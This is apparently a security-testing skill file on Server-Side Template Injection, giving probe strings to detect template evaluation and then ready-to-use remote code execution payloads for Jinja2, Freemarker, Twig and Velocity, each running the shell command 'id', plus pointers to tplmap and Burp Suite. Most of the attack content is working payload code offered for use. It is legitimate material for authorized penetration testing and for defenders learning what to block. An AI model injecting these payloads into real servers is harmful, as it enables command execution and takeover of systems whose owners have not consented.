---
name: ssti
description: Server-Side Template Injection expert methodology. Detection across Jinja2, Twig, Freemarker, Velocity, Mako, Smarty. Exploitation path from SSTI to RCE and data exfiltration.
version: 1.0.0
license: Apache-2.0
---

# Server-Side Template Injection (SSTI)

## Detection

Inject math expressions to detect template evaluation:

```
{{7*7}}         → 49   (Jinja2/Twig)
${7*7}          → 49   (Freemarker/JSP EL)
<%= 7*7 %>      → 49   (ERB)
#{7*7}          → 49   (Ruby Slim)
*{7*7}          → 49   (Spring EL)
{7*7}           → test (Smarty)
```

## Identification

```
{{7*'7'}}
→ 7777777  → Jinja2
→ 49       → Twig
```

## Exploitation by Engine

**Jinja2 (Python):**
```python
{{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Freemarker (Java):**
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
```

**Twig (PHP):**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Velocity (Java):**
```
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
```

## Tools

- [tplmap](https://github.com/epinna/tplmap) — automated SSTI detection and exploitation
- Burp Suite Intruder — payload fuzzing

## OWASP Mapping

- A03:2021 — Injection
